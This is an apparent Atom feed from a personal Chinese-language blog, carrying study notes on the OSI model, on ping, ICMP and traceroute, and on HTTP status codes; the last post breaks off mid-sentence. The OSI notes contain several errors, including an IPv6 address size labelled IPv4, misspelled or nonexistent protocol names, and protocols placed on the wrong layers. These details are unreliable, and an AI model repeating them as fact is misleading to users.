<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>blog</title>
  
  <subtitle>Sinevil</subtitle>
  <link href="https://sinevil.github.io/atom.xml" rel="self"/>
  
  <link href="https://sinevil.github.io/"/>
  <updated>2021-08-15T10:21:20.913Z</updated>
  <id>https://sinevil.github.io/</id>
  
  <author>
    <name>Mr.Li</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>OSI七层模型</title>
    <link href="https://sinevil.github.io/2021/08/13/OSI/"/>
    <id>https://sinevil.github.io/2021/08/13/OSI/</id>
    <published>2021-08-13T07:04:22.000Z</published>
    <updated>2021-08-15T10:21:20.913Z</updated>
    
    <content type="html"><![CDATA[<p><strong>OSI七层模型</strong></p><ul><li>什么是OSI七层模型</li></ul><p>OSI模型又称为开放式系统互联通信参考模型，该模型定义了网络互联的七层框架，物理层，数据链路层，网络层，传输层，会话层，表示层和应用层</p><ul><li>物理层（比特流传输）<ul><li>通过光缆，电缆，无线电波等方式将设备连接起来组网</li><li>两个不同区域局域网（移动，电信）通信，需要ISP互联网服务供应商的物理连接</li><li>作用：传输比特流 0和1（未涉及）</li><li>网络协议：IEE 802.1A ,IEE 802.2 到IEE 802.11</li></ul></li></ul><ul><li>数据链路层（控制网络层与物理层之间的通信）<ul><li>作用：根据以太网协议将一组电信号组成一个数据包，称作“帧”，并控制他的传输<ul><li>标头head ：标明数据发送者，接收者，数据类型</li><li>数据data</li></ul></li><li>MAC地址<ul><li>即网卡地址，每个网卡都是独一无二的12个16进制数<ul><li>前六个表示厂商，后六个表示流水号</li></ul></li><li>作用：定位数据包的路径，如发送者，接收者</li></ul></li><li>广播方式<ul><li>发送者把数据包发送给局域网内的所有PC端，让每个PC根据MAC地址自动匹配</li><li>发送媒介：分组交换机/网络交换机</li></ul></li><li>网络交换机<ul><li>扩展网络的机器</li><li>作用：为子网提供更多的接口，以及连接更多的PC</li></ul></li><li>网络协议：PDDI,Ethernet，Arpanet，PDN,SLIP,PPP</li></ul></li><li>网络层（IP寻址和路由选择）<ul><li>作用：建立主机-主机的连接</li><li>引入新的地址模式-IP地址/网络地址，可以区分哪些PC是在同一局域网内</li><li>IP类型分类<ul><li>IPv4：32个二进制，4字节*8位</li><li>IPv4：128个二进制，8字节*16位</li></ul></li><li>子网掩码<ul><li>通过and运算符判断是否在同一子网下 IP  and  255.255.255.0</li></ul></li><li>路由<ul><li>作用：通过网络把数据从原地址到目标地址，引导分组传送，经过一些中间节点后，到达目的地</li><li>实现方法：定义一条路径，经过因特网把包发送到目的地，但不指定完全路径，只定义两个网关之间的路径段</li><li>路由器：连接两个或多个网络并实现路由功能的机器，可看作配有多个网卡的专用电脑，让网卡插入不同的网络中</li><li>网关：网络层使用的路由器，通常指向路由IP</li><li>示例：A-发送地址 B-接收地址<ul><li>若在同一局域网，通过广播即可找到</li><li>若在不同局域网，A先将包根据网关添加路由器/主机地址，通过交换机的广播方式发给主机，A的主机将数据包传给B所在的主机，再由主机根据MAC广播给B完成（IP包不断被路由封装和拆开【添加/删除地址】）</li></ul></li><li>网络协议：IP, IMCP, WPR, RARP, AKP, UUCP </li></ul></li></ul></li><li>传输层（建立，维护，管理端到端连接）<ul><li>作用：建立端口-端口间的连接</li><li>端口号<ul><li>取值：0-65535<ul><li>0-1023 系统占用</li><li>应用程序随机抽取</li></ul></li><li>指定IP包具体给哪个进程；另外，一个进程可能与多个计算机连接，会有多个端口</li></ul></li><li>socket<ul><li>进程间通信：需要双方IP，端口号，通信采用的协议栈</li><li>格式： 无符号整形变量，用来表示一个通信进程</li><li>本质： 是编程接口API，对TCP/TP协议的封装</li></ul></li><li>网络协议：TCP, UDP</li></ul></li><li>会话层（建立，维护，管理会话连接）<ul><li>网路协议：SMTP, DNS</li></ul></li><li>表示层（数据格式化，加密，解密）<ul><li>网络协议：Telnet, Rlogin, SNMAP, Gopher</li></ul></li><li>应用层（为应用程序提供网络服务）<ul><li>网络协议：HTTP, TFTP, FTP, NFS, WAIS, SMTP</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;OSI七层模型&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是OSI七层模型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;OSI模型又称为开放式系统互联通信参考模型，该模型定义了网络互联的七层框架，物理层，数据链路层，网络层，传输层，会话层，表示层和应用层&lt;/p&gt;
&lt;u</summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="模型" scheme="https://sinevil.github.io/tags/%E6%A8%A1%E5%9E%8B/"/>
    
  </entry>
  
  <entry>
    <title>ping的工作原理</title>
    <link href="https://sinevil.github.io/2021/08/13/ping/"/>
    <id>https://sinevil.github.io/2021/08/13/ping/</id>
    <published>2021-08-13T07:04:13.000Z</published>
    <updated>2021-08-15T11:41:37.288Z</updated>
    
    <content type="html"><![CDATA[<p><strong>ping的工作原理</strong></p><ul><li><h3 id="IP协议的助手-——-ICMP-协议"><a href="#IP协议的助手-——-ICMP-协议" class="headerlink" title="IP协议的助手 —— ICMP 协议"></a>IP协议的助手 —— ICMP 协议</h3><p>ping 是基于 <code>ICMP</code> 协议工作的，所以要明白 ping 的工作，首先我们先来熟悉 <strong>ICMP 协议</strong>。</p><ul><li>ICMP是什么？</li></ul><p>ICMP 全称是 <strong>Internet Control Message Protocol</strong>，也就是<strong>互联网控制报文协议</strong>。</p><p>里面有个关键词 —— <strong>控制</strong>，如何控制的呢？</p><p>网络包在复杂的网络传输环境里，常常会遇到各种问题。当遇到问题的时候，总不能死的不明不白，没头没脑的作风不是计算机网络的风格。所以需要传出消息，报告遇到了什么问题，这样才可以调整传输策略，以此来控制整个局面。</p><ul><li>ICMP的功能有什么？</li></ul><p><code>ICMP</code> 主要的功能包括：<strong>确认 IP 包是否成功送达目标地址、报告发送过程中 IP 包被废弃的原因和改善网络设置等。</strong></p><p>在 <code>IP</code> 通信中如果某个 <code>IP</code> 包因为某种原因未能达到目标地址，那么这个具体的原因将<strong>由 ICMP 负责通知</strong>。</p></li></ul><p><img src="/2021/08/13/ping/v2-a7f786ea2fdf2e8658b9e708401ba793_r.jpg"></p><p>如上图例子，主机 <code>A</code> 向主机 <code>B</code> 发送了数据包，由于某种原因，途中的路由器 <code>2</code> 未能发现主机 <code>B</code> 的存在，这时，路由器 <code>2</code> 就会向主机 <code>A</code> 发送一个 <code>ICMP</code> 目标不可达数据包，说明发往主机 <code>B</code> 的包未能成功。</p><p>ICMP 的这种通知消息会使用 <code>IP</code> 进行发送 。</p><p>因此，从路由器 <code>2</code> 返回的 ICMP 包会按照往常的路由控制先经过路由器 <code>1</code> 再转发给主机 <code>A</code> 。收到该 ICMP 包的主机 <code>A</code> 则分解 ICMP 的首部和数据域以后得知具体发生问题的原因</p><ul><li>ICMP包 头格式</li></ul><p>ICMP报文是封装在IP包里面，它工作在网络层，是IP协议的助手</p><p><img src="/2021/08/13/ping/v2-5f4200a23e40bdf3bddc6cbaf14a689a_720w.jpg"></p><ul><li>ICMP包 头的类型字段，大致可分为两大类<ul><li>一类是用于诊断的查询信息，也就是【查询报文类型】</li><li>一类是通知出错原因的错误消息，也就是【差错报文类型】</li></ul></li></ul><p><img src="/2021/08/13/ping/v2-0f9ced50c9ef74b142fee86d33b6e741_720w.jpg" alt="img"></p><ul><li><p>查询报文类型</p><ul><li>回送消息类型 0和8</li></ul><p>回送消息用于进行通信的主机或路由器之间，判断所发送的数据包是否已经成功到达对端的一种消息，ping指令就是利用这个消息实现的</p><p><img src="/2021/08/13/ping/v2-99f5cb96bd66d4d1c42ed4757dda438d_720w.jpg" alt="v2-99f5cb96bd66d4d1c42ed4757dda438d_720w"><br>可以向对端主机发送<strong>回送请求</strong>的消息（<code>ICMP Echo Request Message</code>，类型 <code>8</code>），也可以接收对端主机发回来的<strong>回送应答</strong>消息（<code>ICMP Echo Reply Message</code>，类型 <code>0</code>）</p><p><img src="/2021/08/13/ping/v2-6e5a1c43ead4f234faafea0a6dc0b99f_720w.jpg" alt="v2-6e5a1c43ead4f234faafea0a6dc0b99f_720w"></p><ul><li><p>相比原生的 ICMP，这里多了两个字段：</p><ul><li>标识符：用以区分是哪个应用程序发 ICMP 包，比如用进程 <code>PID</code> 作为标识符；</li><li>序号：序列号从 <code>0</code> 开始，每发送一次新的回送请求就会加 <code>1</code>， 可以用来确认网络包是否有丢失。</li></ul><p>在选项数据中，<code>ping</code> 还会存放发送请求的时间值，来计算往返时间，说明路程的长短</p></li></ul></li><li><p>差错报文类型</p><ul><li>目标不可达消息 —— 类型 为 <code>3</code></li><li>原点抑制消息 —— 类型 <code>4</code></li><li>重定向消息 —— 类型 <code>5</code></li><li>超时消息 —— 类型 <code>11</code></li></ul></li><li><p>目标不可达消息</p></li></ul><p>IP 路由器无法将 IP 数据包发送给目标地址时，会给发送端主机返回一个<strong>目标不可达</strong>的 ICMP 消息，并在这个消息中显示不可达的具体原因，原因记录在 ICMP 包头的<strong>代码</strong>字段。</p><p>由此，根据 ICMP 不可达的具体消息，发送端主机也就可以了解此次发送<strong>不可达的具体原因</strong></p><p><img src="/2021/08/13/ping/v2-435d560662dc9b0418e00ca5241d92c9_720w.jpg" alt="img"></p><ul><li><p>常见不可达类型代码</p><ul><li><p>网络不可达代码为 <code>0</code></p><p>外卖版本：</p></li></ul><p>小林第一次送外卖时，小区里只有 A 和 B 区两栋楼，但送餐地址写的是 C 区楼，小林表示头上很多问号，压根就没这个地方。</p><p>​      正常版本：</p><p>IP 地址是分为网络号和主机号的，所以当路由器中的路由器表匹配不到接收方 IP 的网络号，就通过 ICMP 协议以<strong>网络不可达</strong>（<code>Network Unreachable</code>）的原因告知主机。</p><p>自从不再有网络分类以后，网络不可达也渐渐不再使用了</p><ul><li><p>主机不可达代码为 <code>1</code></p><p>外卖版本：</p></li></ul><p>小林第二次送外卖时，这次小区有 5 层楼高的 C 区楼了，找到地方了，但送餐地址写的是 C 区楼 601 号房 ，说明找不到这个房间。</p><p>​       正常版本：</p><p>当路由表中没有该主机的信息，或者该主机没有连接到网络，那么会通过 ICMP 协议以<strong>主机不可达</strong>（<code>Host Unreachable</code>）的原因告知主机。</p><ul><li><p>协议不可达代码为 <code>2</code></p><p>外卖版本：</p></li></ul><p>小林第三次送外卖时，这次小区有 C 区楼，也有 601 号房，找到地方了，也找到房间了，但是一开门人家是外国人说的是英语，我说的是中文！语言不通，外卖送达失败~</p><p>​       正常版本：</p><p>当主机使用 TCP 协议访问对端主机时，能找到对端的主机了，可是对端主机的防火墙已经禁止 TCP 协议访问，那么会通过 ICMP 协议以<strong>协议不可达</strong>的原因告知主机</p><ul><li><p>端口不可达代码为 <code>3</code></p><p>外卖版本：</p></li></ul><p>小林第四次送外卖时，这次小区有 C 区楼，也有 601 号房，找到地方了，也找到房间了，房间里的人也是说中文的人了，但是人家说他要的不是外卖，而是快递。。。</p><p>​       正常版本：</p><p>当主机访问对端主机 8080 端口时，这次能找到对端主机了，防火墙也没有限制，可是发现对端主机没有进程监听 8080 端口，那么会通过 ICMP 协议以<strong>端口不可达</strong>的原因告知主机</p><ul><li><p>需要进行分片但设置了不分片位代码为 <code>4</code></p><p>外卖版本：</p></li></ul><p>小林第五次送外卖时，这次是个吃播博主点了 100 份外卖，但是吃播博主要求一次性要把全部外卖送达，小林的一台电动车装不下呀，这样就没办法送达了。</p><p>​       正常版本：</p><p>发送端主机发送 IP 数据报时，将 IP 首部的<strong>分片禁止标志位</strong>设置为<code>1</code>。根据这个标志位，途中的路由器遇到超过 MTU 大小的数据包时，不会进行分片，而是直接抛弃。</p><p>随后，通过一个 ICMP 的不可达消息类型，<strong>代码为 4</strong> 的报文，告知发送端主机</p></li></ul><ul><li> 原点抑制消息（ICMP Source Quench Message） —— 类型 <code>4</code></li></ul><p>在使用低速广域线路的情况下，连接 WAN 的路由器可能会遇到网络拥堵的问题。</p><p><code>ICMP</code> 原点抑制消息的目的就是<strong>为了缓和这种拥堵情况</strong>。</p><p>当路由器向低速线路发送数据时，其发送队列的缓存变为零而无法发送出去时，可以向 IP 包的源地址发送一个 ICMP <strong>原点抑制消息</strong>。</p><p>收到这个消息的主机借此了解在整个线路的某一处发生了拥堵的情况，从而增大 IP 包的传输间隔，减少网络拥堵的情况。</p><p>然而，由于这种 ICMP 可能会引起不公平的网络通信，一般不被使用。</p><ul><li>重定向消息（ICMP Redirect Message） —— 类型 <code>5</code></li></ul><p>如果路由器发现发端主机使用了「不是最优」的路径发送数据，那么它会返回一个 ICMP <strong>重定向消息</strong>给这个主机。</p><p>在这个消息中包含了<strong>最合适的路由信息和源数据</strong>。这主要发生在路由器持有更好的路由信息的情况下。路由器会通过这样的 ICMP 消息告知发送端，让它下次发给另外一个路由器。</p><p>好比，小林本可以过条马路就能到的地方，但小林不知道，所以绕了一圈才到，后面小林知道后，下次小林就不会那么<strong>傻</strong>再绕一圈了。</p><ul><li>超时消息（ICMP Time Exceeded Message） —— 类型 <code>11</code></li></ul><p>IP 包中有一个字段叫做 <code>TTL</code> （<code>Time To Live</code>，生存周期），它的<strong>值随着每经过一次路由器就会减 1，直到减到 0 时该 IP 包会被丢弃。</strong></p><p>此时，路由器将会发送一个 ICMP <strong>超时消息</strong>给发送端主机，并通知该包已被丢弃。</p><p>设置 IP 包生存周期的主要目的，是为了在路由控制遇到问题发生循环状况时，避免 IP 包无休止地在网络上被转发。</p><p><img src="/2021/08/13/ping/v2-bf2510a2566692f13f18e5e794659771_720w.jpg" alt="img"></p><p>此外，有时可以用 TTL 控制包的到达范围，例如设置一个<strong>较小的 TTL 值</strong>。</p><ul><li><h3 id="ping-——-查询报文类型的使用"><a href="#ping-——-查询报文类型的使用" class="headerlink" title="ping —— 查询报文类型的使用"></a>ping —— 查询报文类型的使用</h3><p>接下来，我们重点来看 <code>ping</code> 的<strong>发送和接收过程</strong>。</p><p>同个子网下的主机 A 和 主机 B，主机 A 执行<code>ping</code> 主机 B 后，我们来看看其间发送了什么？</p><p><img src="/2021/08/13/ping/v2-1c0a5410f3b68790d876d2c3773d0ae4_720w.jpg" alt="img"></p><p>ping 命令执行的时候，源主机首先会构建一个 <strong>ICMP 回送请求消息</strong>数据包。</p><p>ICMP 数据包内包含多个字段，最重要的是两个：</p><ul><li>第一个是<strong>类型</strong>，对于回送请求消息而言该字段为 <code>8</code>；</li><li>另外一个是<strong>序号</strong>，主要用于区分连续 ping 的时候发出的多个数据包。</li></ul><p>每发出一个请求数据包，序号会自动加 <code>1</code>。为了能够计算往返时间 <code>RTT</code>，它会在报文的数据部分插入发送时间。</p><p><img src="/2021/08/13/ping/v2-7fc0891849170023bca4ed09ad1fd2ae_720w.jpg" alt="img"></p><p>然后，由 ICMP 协议将这个数据包连同地址 192.168.1.2 一起交给 IP 层。IP 层将以 192.168.1.2 作为<strong>目的地址</strong>，本机 IP 地址作为<strong>源地址</strong>，<strong>协议</strong>字段设置为 <code>1</code> 表示是 <code>ICMP</code> 协议，再加上一些其他控制信息，构建一个 <code>IP</code> 数据包。</p><p><img src="https://pic3.zhimg.com/80/v2-52bb944dcb4875d50fd1d254ecb83202_720w.jpg" alt="img"></p><p>接下来，需要加入 <code>MAC</code> 头。如果在本地 ARP 映射表中查找出 IP 地址 192.168.1.2 所对应的 MAC 地址，则可以直接使用；如果没有，则需要发送 <code>ARP</code> 协议查询 MAC 地址，获得 MAC 地址后，由数据链路层构建一个数据帧，目的地址是 IP 层传过来的 MAC 地址，源地址则是本机的 MAC 地址；还要附加上一些控制信息，依据以太网的介质访问规则，将它们传送出去。</p><p><img src="/2021/08/13/ping/v2-356582a65204ac9801a057f13f964db2_720w.png" alt="img"></p><p>主机 <code>B</code> 收到这个数据帧后，先检查它的目的 MAC 地址，并和本机的 MAC 地址对比，如符合，则接收，否则就丢弃。</p><p>接收后检查该数据帧，将 IP 数据包从帧中提取出来，交给本机的 IP 层。同样，IP 层检查后，将有用的信息提取后交给 ICMP 协议。</p><p>主机 <code>B</code> 会构建一个 <strong>ICMP 回送响应消息</strong>数据包，回送响应数据包的<strong>类型</strong>字段为 <code>0</code>，<strong>序号</strong>为接收到的请求数据包中的序号，然后再发送出去给主机 A。</p><p><img src="/2021/08/13/ping/v2-5e09f8486919266ce4eb90ca6bfaebc5_720w.png" alt="img"></p><p>在规定的时候间内，源主机如果没有接到 ICMP 的应答包，则说明目标主机不可达；如果接收到了 ICMP 回送响应消息，则说明目标主机可达。</p><p>此时，源主机会检查，用当前时刻减去该数据包最初从源主机上发出的时刻，就是 ICMP 数据包的时间延迟。</p><p>针对上面发送的事情，总结成了如下图：</p><p><img src="/2021/08/13/ping/v2-76f42eeccc87778485c3bfa9a22a7f54_720w.jpg" alt="img"></p><p>当然这只是最简单的，同一个局域网里面的情况。如果跨网段的话，还会涉及网关的转发、路由器的转发等等。</p><p>但是对于 ICMP 的头来讲，是没什么影响的。会影响的是根据目标 IP 地址，选择路由的下一跳，还有每经过一个路由器到达一个新的局域网，需要换 MAC 头里面的 MAC 地址。</p><p>说了这么多，可以看出 ping 这个程序是<strong>使用了 ICMP 里面的 ECHO REQUEST（类型为 8 ） 和 ECHO REPLY （类型为 0）</strong>。</p><h3 id="traceroute-——-差错报文类型的使用"><a href="#traceroute-——-差错报文类型的使用" class="headerlink" title="traceroute —— 差错报文类型的使用"></a><strong>traceroute —— 差错报文类型的使用</strong></h3><p>有一款充分利用 ICMP <strong>差错报文类型</strong>的应用叫做 <code>traceroute</code>（在UNIX、MacOS中是这个命令，而在Windows中对等的命令叫做 tracert ）。</p><p><em>1. traceroute 作用一</em></p><p>traceroute 的第一个作用就是<strong>故意设置特殊的 TTL，来追踪去往目的地时沿途经过的路由器。</strong></p><p>traceroute 的参数指向某个<strong>目的 IP 地址</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">traceroute 192.168.1.100</span><br></pre></td></tr></table></figure><ul><li> 这个作用是如何工作的呢？</li></ul><p>它的原理就是利用 IP 包的<strong>生存期限</strong> 从 <code>1</code> 开始按照顺序递增的同时发送 <strong>UDP 包</strong>，强制接收 <strong>ICMP 超时消息</strong>的一种方法。</p><p>比如，将 TTL 设置 为 <code>1</code>，则遇到第一个路由器，就牺牲了，接着返回 ICMP 差错报文网络包，类型是<strong>时间超时</strong>。</p><p>接下来将 TTL 设置为 <code>2</code>，第一个路由器过了，遇到第二个路由器也牺牲了，也同时返回了 ICMP 差错报文数据包，如此往复，直到到达目的主机。</p><p>这样的过程，traceroute 就可以拿到了所有的路由器 IP。</p><p>当然有的路由器根本就不会返回这个 ICMP，所以对于有的公网地址，是看不到中间经过的路由的。</p><ul><li>发送方如何知道发出的 UDP 包是否到达了目的主机呢？</li></ul><p>traceroute 在发送 <code>UDP</code> 包时，会填入一个<strong>不可能的端口号</strong>值作为 UDP 目标端口号（大于 <code>3000</code> ）。当目的主机，收到 UDP 包后，会返回 ICMP 差错报文消息，但这个差错报文消息的类型是「<strong>端口不可达</strong>」。</p><p>所以，<strong>当差错报文类型是端口不可达时，说明发送方发出的 UDP 包到达了目的主机。</strong></p><p><em>2. traceroute 作用二</em></p><p>traceroute 还有一个作用是<strong>故意设置不分片，从而确定路径的 MTU</strong>。</p><ul><li>这么做是为了什么？</li></ul><p>这样做的目的是为了<strong>路径MTU发现</strong>。</p><p>因为有的时候我们并不知道路由器的 <code>MTU</code> 大小，以太网的数据链路上的 <code>MTU</code> 通常是 <code>1500</code> 字节，但是非以外网的 <code>MTU</code> 值就不一样了，所以我们要知道 <code>MTU</code> 的大小，从而控制发送的包大小。</p><p><img src="/2021/08/13/ping/v2-5fc2b89727b696373b071b3498573fd7_720w.jpg" alt="img"></p><p>它的工作原理如下：</p><p>首先在发送端主机发送 <code>IP</code> 数据报时，将 <code>IP</code> 包首部的<strong>分片禁止标志位设置为 1</strong>。根据这个标志位，途中的路由器不会对大数据包进行分片，而是将包丢弃。</p><p>随后，通过一个 ICMP 的不可达消息将<strong>数据链路上 MTU 的值</strong>一起给发送主机，不可达消息的类型为「<strong>需要进行分片但设置了不分片位</strong>」。</p><p>发送主机端每次收到 ICMP 差错报文时就<strong>减少</strong>包的大小，以此来定位一个合适的 <code>MTU</code> 值，以便能到达目标主机。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;ping的工作原理&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;h3 id=&quot;IP协议的助手-——-ICMP-协议&quot;&gt;&lt;a href=&quot;#IP协议的助手-——-ICMP-协议&quot; class=&quot;headerlink&quot; title=&quot;IP协议的助手 —— IC</summary>
      
    
    
    
    <category term="web基础" scheme="https://sinevil.github.io/categories/web%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="ping" scheme="https://sinevil.github.io/tags/ping/"/>
    
  </entry>
  
  <entry>
    <title>http状态码</title>
    <link href="https://sinevil.github.io/2021/08/13/http%E7%8A%B6%E6%80%81%E7%A0%81/"/>
    <id>https://sinevil.github.io/2021/08/13/http%E7%8A%B6%E6%80%81%E7%A0%81/</id>
    <published>2021-08-13T03:11:42.000Z</published>
    <updated>2021-08-13T03:29:04.550Z</updated>
    
    <content type="html"><![CDATA[<p><strong>http状态码</strong></p><ul><li>常见状态码<ul><li>200  请求成功</li><li>301 资源网页被永久转移到其他URL</li><li>404 请求的资源网页 不存在</li><li>500 内部服务器错误</li></ul></li><li>http状态码分类</li></ul><p>http状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型，后面的两个数字没有分类的作用</p><table><thead><tr><th>分类</th><th>分类描述</th></tr></thead><tbody><tr><td>1**</td><td>信息，服务器收到请求，需要请求着继续执行</td></tr><tr><td>2**</td><td>成功，操作被成功接收并处理</td></tr><tr><td>3**</td><td>重定向，需要进一步的操作完成请求</td></tr><tr><td>4**</td><td>客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td>5**</td><td>服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><ul><li>状态码详情(1**)<ul><li><code>100</code>: <strong>客户端应当继续发送请求</strong>。这个临时响应是用来通知客户端它的部分请求已经被服务器接收，且仍未被拒绝。客户端应当继续发送请求的剩余部分，或者如果请求已经完成，忽略这个响应。服务器必须在请求完成后向客户端发送一个最终响应。</li><li><code>101</code>: <strong>服务器已经理解了客户端的请求,并将通过<code>Upgrade 消息头</code>通知客户端采用不同的协议来完成这个请求</strong>。在发送完这个响应最后的空行后，服务器将会切换到在<code>Upgrade 消息头</code>中定义的那些协议。只有在切换新的协议更有好处的时候才应该采取类似措施。例如，切换到新的<code>HTTP</code> 版本比旧版本更有优势，或者切换到一个实时且同步的协议以传送利用此类特性的资源。</li><li><code>102</code>: 由<code>WebDAV（RFC 2518）</code>扩展的状态码，代表<strong>处理将被继续执行</strong></li></ul></li><li>状态码详情(2**)<ul><li><code>200</code>: <strong>请求已成功</strong>，请求所希望的响应头或数据体将随此响应返回。</li><li><code>201</code>: <strong>请求已经被实现</strong>，而且有一个新的资源已经依据请求的需要而建立，且其 <code>URI</code> 已经随<code>Location</code> 头信息返回。假如需要的资源无法及时建立的话，应当返回 <code>&#39;202 Accepted&#39;</code>。</li><li><code>202</code>: <strong>服务器已接受请求，但尚未处理</strong>。正如它可能被拒绝一样，最终该请求可能会也可能不会被执行。在异步操作的场合下，没有比发送这个状态码更方便的做法了。返回<code>202状态码</code>的响应的目的是允许服务器接受其他过程的请求（<code>例如某个每天只执行一次的基于批处理的操作</code>），而不必让客户端一直保持与服务器的连接直到批处理操作全部完成。在接受请求处理并返回<code>202状态码</code>的响应应当在返回的实体中包含一些<code>指示处理当前状态</code>的信息，以及指向处理状态监视器或状态预测的指针，以便用户能够估计操作是否已经完成。</li><li><code>203</code>: <strong>服务器已成功处理了请求</strong>，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或者超集。</li><li><code>204</code>: <strong>服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新了的元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息</strong>。如果存在这些头部信息，则应当与所请求的变量相呼应。如果客户端是浏览器的话，那么用户浏览器应保留发送了该请求的页面，而不产生任何文档视图上的变化，即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。由于 <code>204</code> 响应被禁止包含任何消息体，因此它始终以消息头后的第一个空行结尾。</li><li><code>205</code>: <strong>服务器成功处理了请求，且没有返回任何内容</strong>。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。</li><li><code>206</code>: <strong>服务器已经成功处理了部分 GET 请求</strong>。类似于 <code>FlashGet</code> 或者迅雷这类的 <code>HTTP</code> 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。该请求必须包含 <code>Range</code> 头信息来指示客户端希望得到的内容范围，并且可能包含 <code>If-Range</code> 来作为请求条件。响应必须包含如下的头部域:<code>Content-Range</code>用以指示本次响应中返回的内容的范围；如果是 <code>Content-Type</code> 为 <code>multipart/byteranges</code> 的多段下载，则每一 <code>multipart</code> 段中都应包含 <code>Content-Range</code> 域用以指示本段的内容范围。假如响应中包含<code>Content-Length</code>，那么它的数值必须匹配它返回的内容范围的真实字节数。<code>Date ETag 和/或Content-Location</code>，假如同样的请求本应该返回<code>200响应</code>。<code>Expires, Cache-Control，和/或 Vary</code>，假如其值可能与之前相同变量的其他响应对应的值不同的话。假如本响应请求使用了 <code>If-Range</code> 强缓存验证，那么本次响应不应该包含其他实体头；假如本响应的请求使用了 <code>If-Range</code>弱缓存验证，那么本次响应禁止包含其他实体头；这避免了缓存的实体内容和更新了的实体头信息之间的不一致。否则，本响应就应当包含所有本应该返回<code>200响应</code>中应当返回的所有实体头部域。假如 <code>ETag</code> 或 <code>Last-Modified</code>头部不能精确匹配的话，则客户端缓存应禁止将<code>206响应</code>返回的内容与之前任何缓存过的内容组合在一起。任何不支持 <code>Range</code> 以及 <code>Content-Range</code>头的缓存都禁止缓存<code>206响应</code>返回的内容。</li><li><code>207</code>: 由 <code>WebDAV(RFC 2518)</code>扩展的状态码，代表之后的消息体将是一个<code>XML</code>消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。</li></ul></li><li>状态码详情(3**)<ul><li><code>300</code>:被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。</li><li><code>301</code>:被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。</li><li><code>302</code>:请求的资源现在临时从不同的URI响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。</li><li><code>303</code>:对应当前请求的响应可以在另一个 URI 上被找到，而且客户端应当采用 GET 的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的<code>POST</code>请求输出重定向到一个新的资源。这个新的 <code>URI</code> 不是原始资源的替代引用。同时，<code>303响应</code>禁止被缓存。</li><li><code>304</code>:如果客户端发送了一个带条件的<code>GET请求</code>且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。</li><li><code>305</code>:被请求的资源必须通过指定的代理才能被访问。Location 域中将给出指定的代理所在的 URI 信息，接收者需要重复发送一个单独的请求，通过这个代理才能访问相应资源。只有原始服务器才能建立305响应。</li><li><code>306</code>:在最新版的规范中，306状态码已经不再被使用。</li><li><code>307</code>:请求的资源现在临时从不同的URI响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求</li></ul></li><li>状态码详情(4**)<ul><li><code>400</code>:1、语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。2、请求参数有误。</li><li><code>401</code>:当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 <code>WWW-Authenticate</code> 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的<code>Authorization</code>头信息的请求。如果当前请求已经包含了 <code>Authorization</code>证书，那么<code>401响应</code>代表着服务器验证已经拒绝了那些证书。如果<code>401响应</code>包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。</li><li><code>402</code>:该状态码是为了将来可能的需求而预留的。</li><li><code>403</code>:服务器已经理解请求，但是拒绝执行它。与<code>401响应</code>不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。</li><li><code>404</code>:请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。</li><li><code>405</code>:请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个<code>Allow 头信息</code>用以表示出当前资源能够接受的请求方法的列表。</li><li><code>406</code>:请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体。</li><li><code>407</code>:与<code>401响应</code>类似，只不过客户端必须在代理服务器上进行身份验证。</li><li><code>408</code>:请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这一请求而无需进行任何更改。</li><li><code>409</code>:由于和被请求的资源的当前状态之间存在冲突，请求无法完成。</li><li><code>410</code>:被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。</li><li><code>411</code>:服务器拒绝在没有定义Content-Length头的情况下接受请求。在添加了表明请求消息体长度的有效 